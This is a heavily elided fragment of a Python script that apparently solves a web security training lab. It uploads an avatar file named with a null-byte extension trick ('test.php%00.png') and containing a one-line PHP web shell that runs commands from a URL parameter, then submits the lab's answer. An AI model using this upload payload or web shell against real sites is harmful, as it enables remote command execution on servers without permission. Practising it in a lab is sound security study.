    ...
    if "Log out" in res.text :
        ...
        if matches :
            ...
            if csrf_token :
                ...
                data = {
                    "avatar":("test.php%00.png","<?php system($_GET['cmd']); ?>","application/x-php"),
                    "user":"wiener",
                    "csrf":csrf_token
                }
                ...
                r = session.post(avatar_url, data=m, headers=headers, verify=False, proxies=proxies)
                ...
                if r.status_code == 200 :
                    ...
                    if r.status_code == 200 :
                        ...
                        data = {'answer':r.text.strip(' ')}
                        r = session.post(solution_url, data=data, verify=False, proxies=proxies)

                        if r.status_code == 200 :
                            print('(+) Grate You have successfully solved the lab.')
                        else :
